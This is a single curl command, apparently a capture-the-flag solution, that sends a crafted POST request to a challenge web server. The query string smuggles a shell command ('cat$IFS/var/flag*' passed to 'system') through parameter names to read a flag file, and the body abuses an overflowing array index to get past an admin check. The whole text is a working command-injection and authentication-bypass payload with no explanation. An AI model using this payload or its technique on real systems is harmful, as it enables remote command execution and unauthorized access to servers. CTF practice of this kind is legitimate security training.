curl -X POST \
  'http://chall.hackaflag.com.br:7997/another/index.php?0=x&x=aaaaaaaaaaaaaaaaaa&cat$IFS/var/flag*=system&cat$IFS/var/flag%2A=system' \
  -H 'Cache-Control: no-cache' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Postman-Token: 640c0111-87a3-4b8f-95f7-dd28e0fd86b6' \
  -d 'b%5B4294967296%5D=admin&b[1]=oloco'